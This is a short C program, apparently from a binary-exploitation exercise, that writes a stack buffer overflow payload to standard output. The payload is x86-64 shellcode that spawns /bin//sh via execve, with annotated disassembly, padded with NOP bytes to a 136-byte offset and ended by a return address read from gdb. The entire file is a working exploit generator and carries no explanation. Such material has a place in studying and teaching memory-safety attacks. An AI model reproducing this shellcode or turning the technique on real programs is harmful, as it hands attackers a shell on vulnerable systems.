#include <memory.h>
#include <stdio.h>

/**
 * clang -o push_string_shellcode_exploit push_string_shellcode_exploit.c
 */
int main(void) {
  char shellcode[] =
      "\x48\x31\xd2"                             // xor    %rdx,%rdx
      "\x48\x31\xc0"                             // xor    %rax,%rax
      "\x50"                                     // push   %rax
      "\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68" // movabs $0x68732f2f6e69622f,%rbx
      "\x53"                                     // push   %rbx
      "\x48\x89\xe7"                             // mov    %rsp,%rdi
      "\x52"                                     // push   %rdx
      "\x57"                                     // push   %rdi
      "\x48\x89\xe6"                             // mov    %rsp,%rsi
      "\xb0\x3b"                                 // mov    $0x3b,%al
      "\x0f\x05";                                // syscall

  size_t shellcode_size = (sizeof shellcode) - 1;

  int offset = 136;
  int padded_bytes = offset - shellcode_size;

  {
    fwrite(shellcode, 1, shellcode_size, stdout);
  }

  {
    char pad[] = "\x90";
    for (int i = 0; i < padded_bytes; i++)
      fwrite(pad, 1, 1, stdout);
  }

  {
    char addr[] = "\x90\xdc\xff\xff\xff\x7f"; // gdb 0x7fffffffdc90
    //char addr[] = "\x10\xdd\xff\xff\xff\x7f"; // 0x7fffffffdd10
    fwrite(addr, 1, 6, stdout);
  }

  putchar('\0');
}